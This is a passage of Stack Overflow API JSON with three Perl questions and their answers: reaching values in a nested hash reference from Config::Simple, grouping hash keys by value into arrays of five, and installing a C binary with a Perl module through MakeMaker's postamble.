"user_type": "registered", "profile_image": "https://i.stack.imgur.com/5APW1.jpg?s=128&g=1", "display_name": "boobie_goodness", "link": "https://stackoverflow.com/users/1023294/boobie-goodness"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "accepted_answer_id": 35773188, "answer_count": 1, "score": -1, "last_activity_date": 1457010816, "creation_date": 1457009078, "question_id": 35772555, "link": "https://stackoverflow.com/questions/35772555/ref-to-a-hash-its-member-array-this-arrays-members-value-how-to-elegant", "title": "ref to a hash -&gt; its member array -&gt; this array&#39;s member&#39;s value. How to elegantly access and test?", "body": "<p>I want to use an expression like</p>\n\n<pre><code>@{ %$hashref{'key_name'}[1]\n</code></pre>\n\n<p>or </p>\n\n<pre><code>%$hashref{'key_name}-&gt;[1]\n</code></pre>\n\n<p>to get - and then test - the second (index = 1) member of an array (reference) held by my hash as its \"key_name\" 's value. But, I can not.</p>\n\n<p>This code here is correct (it works), but I would have liked to combine the two lines that I have marked into one single, efficient, perl-elegant line.</p>\n\n<pre><code>foreach  my $tag  ('doit', 'source', 'dest' ) {\n    my $exists = exists( $$thisSectionConfig{$tag}); \n    my @tempA = %$thisSectionConfig{$tag} ;          #this line\n    my $non0len = (@tempA[1] =~ /\\w+/ );             # and this line\n    if ( !$exists || !$non0len) {\n        print STDERR \"No complete \\\"$tag\\\" ... etc ... \\n\";\n        # program exit ...\n    }\n</code></pre>\n\n<p>I know you (the general 'you') can elegantly combine these two lines. Could someone tell me how I could do this? </p>\n\n<p>This code it testing a section of a config file that has been read into a $thisSectionConfig reference-to-a-hash by Config::Simple. Each config file key=value pair then is (I looked with datadumper) held as a two-member array: [0] is the key, [1] is the value. The $tag 's are configuration settings that must be present in the config file sections being processed by this code snippet.</p>\n\n<p>Thank you for any help. </p>\n"}, {"tags": ["perl", "hash"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1457008352, "post_id": 35772117, "comment_id": 59215816, "body": "Re &quot;<i>I have a hash having duplicate keys</i>&quot;, That&#39;s not possible. That&#39;s like someone saying they have an array with duplicate indexes."}, {"owner": {"reputation": 1, "user_id": 3909630, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97194af3b445fa15941468766cb14e09?s=128&d=identicon&r=PG&f=1", "display_name": "jsr", "link": "https://stackoverflow.com/users/3909630/jsr"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457008530, "post_id": 35772117, "comment_id": 59215939, "body": "Thats why i made reverse having duplicate values and unique keys.These values i have to read from excel sheet."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457008815, "post_id": 35772117, "comment_id": 59216137, "body": "Please fix the question by editing it, not by adding a comment."}, {"owner": {"reputation": 1437, "user_id": 1573649, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/63ea06fa08aecf23b29c5edb7ec3102b?s=128&d=identicon&r=PG&f=1", "display_name": "pmakholm", "link": "https://stackoverflow.com/users/1573649/pmakholm"}, "edited": false, "score": 0, "creation_date": 1457020626, "post_id": 35772117, "comment_id": 59225505, "body": "A few lines of example data and expected result would probably make it more clear what you want\u2026"}], "answers": [{"tags": [], "owner": {"reputation": 1437, "user_id": 1573649, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/63ea06fa08aecf23b29c5edb7ec3102b?s=128&d=identicon&r=PG&f=1", "display_name": "pmakholm", "link": "https://stackoverflow.com/users/1573649/pmakholm"}, "is_accepted": false, "score": 0, "last_activity_date": 1457082521, "last_edit_date": 1457082521, "creation_date": 1457021326, "answer_id": 35777214, "question_id": 35772117, "link": "https://stackoverflow.com/questions/35772117/how-to-store-values-of-hash-in-array-in-perl/35777214#35777214", "title": "How to store values of hash in array in perl?", "body": "<p>So you need to find keys that have the same values?</p>\n\n<p>So we need to kind of revert the array, but being a bit smart to handle that the original values are not unique. Som instead of just transforming 'key' => 'value' pairs to 'value' => 'key', we need to store the keys in arrays.</p>\n\n<pre><code>my %hash = ...;\n\nmy %transposed;\nfor my $key (keys %hash) {\n    my $value = $hash{$key};\n\n    $transposed{$value} = [] unless defined $transposed{$value};\n    push @{ $transposed{$value} }, $key;\n}\n</code></pre>\n\n<p>Then you have a hash of arrays, where each key is a value in the original hash and the elements of the arrays are the keys. The next step is to iterate over the keys and spilt each list into lines of 5 elements:</p>\n\n<pre><code>for my $key (sort keys %transposed) {\n    while (@{ $transposed{$key} }) {\n        my @list = splice @{ $transposed{$key} }, 0, 5;\n        say join \", \", @list;\n    }\n}\n</code></pre>\n\n<p>The main parts is the while loop iterating as long as there are elements in the current list and the splice removes and returns up to 5 element from the list each iteration. Adding the exact C code is left as an exercise for the interested reader... :-)</p>\n\n<p>You might need to read up on references: <a href=\"http://perldoc.perl.org/perlreftut.html\" rel=\"nofollow\">http://perldoc.perl.org/perlreftut.html</a></p>\n\n<p>The line setting a hash value to a reference to an empty array is not necessary as perl will automatically create a arrayref when you tries to push a value to it. I have included it to make it clearer what is going on.</p>\n"}], "owner": {"reputation": 1, "user_id": 3909630, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97194af3b445fa15941468766cb14e09?s=128&d=identicon&r=PG&f=1", "display_name": "jsr", "link": "https://stackoverflow.com/users/3909630/jsr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1117, "favorite_count": 0, "answer_count": 1, "score": -5, "last_activity_date": 1457082521, "creation_date": 1457007806, "last_edit_date": 1457069265, "question_id": 35772117, "link": "https://stackoverflow.com/questions/35772117/how-to-store-values-of-hash-in-array-in-perl", "title": "How to store values of hash in array in perl?", "body": "<p>I have a hash having duplicate values and unique keys.I have to store keys in array of size 5, if more keys are there new array should be created and stored in it.\nThe keys stored in 1 array should have same value.</p>\n\n<p>Note: I have to read those values from excel sheet and generate c source file.</p>\n\n<p>Ex:\n    %hash = (a=>1,b=>2,c=>1,d=>1,e=>3,f=>4,g=>4,h=>1,i=>1,j=>1);</p>\n\n<p>output in c file:</p>\n\n<pre><code>datatype arr1[]={a,c,d,h,i};\ndatatype arr2[]={j};\ndatatype arr3[]={b};\ndatatype arr4[]={e};\ndatatype arr5[]={f,g};\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1457002909, "post_id": 35770187, "comment_id": 59212156, "body": "I think you&#39;re better off asking this in #toolchain on irc.perl.org"}], "answers": [{"comments": [{"owner": {"reputation": 519, "user_id": 4253357, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/a260d4d00483f67c0fe5d0b9e6d60e77?s=128&d=identicon&r=PG&f=1", "display_name": "Michal T", "link": "https://stackoverflow.com/users/4253357/michal-t"}, "edited": false, "score": 0, "creation_date": 1458568292, "post_id": 35790117, "comment_id": 59904290, "body": "Thanks, this worked perfectly. I did add the MY::postamble() piece of makefile from ExtUtils::MakeMaker docs and a EXE_FILES =&gt; [ qw(c_module/c_module_binary) ] to the Makefile.PL to have it copied to the system default binary folder by &quot;make install&quot;."}], "tags": [], "owner": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "is_accepted": true, "score": 1, "last_activity_date": 1457075581, "creation_date": 1457075581, "answer_id": 35790117, "question_id": 35770187, "link": "https://stackoverflow.com/questions/35770187/install-a-pure-c-binary-when-installing-a-perl-module/35790117#35790117", "title": "Install a pure C binary when installing a Perl module", "body": "<p>You can add whatever you want to the generated <code>Makefile</code> by adding a function to your <code>Makefile.PL</code> named <code>MY::postamble()</code> that simply returns the string you want added. This is documented in the <code>ExtUtils::MakeMaker</code> manpage, if you want to read more.</p>\n"}], "owner": {"reputation": 519, "user_id": 4253357, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/a260d4d00483f67c0fe5d0b9e6d60e77?s=128&d=identicon&r=PG&f=1", "display_name": "Michal T", "link": "https://stackoverflow.com/users/4253357/michal-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "accepted_answer_id": 35790117, "answer_count": 1, "score": 2, "last_activity_date": 1457075581, "creation_date": 1457002449, "last_edit_date": 1457002889, "question_id": 35770187, "link": "https://stackoverflow.com/questions/35770187/install-a-pure-c-binary-when-installing-a-perl-module", "title": "Install a pure C binary when installing a Perl module", "body": "<p>I have a part of my Perl module written in C. The module uses the C pthreads library. I was first thinking to add the C code to my module using a standard XS wrapper but this seems possible only in Perl 5.22 because of this bug report: <a href=\"https://rt.perl.org/Public/Bug/Display.html?id=122906\" rel=\"nofollow\">https://rt.perl.org/Public/Bug/Display.html?id=122906</a></p>\n\n<p>My C code doesn't really require any interaction with the rest of Perl code. It just reads a file and writes to another file.</p>\n\n<p>In order to not limit my module to Perl 5.22 and up I was thinking about compiling a simple C binary and calling it from my Perl code using <code>system</code>or backticks.</p>\n\n<p>So my question is: Is it possible to add this kind of target to Makefile.PL and if yes how?\nAnd maybe an input on if this kind of installation process is desirable for a Perl module as I might also just release the C code separately on Github.\nTo me it seems logical to install it alongside the Perl module as the C binary has no other use than to work with the Perl module.</p>\n"}]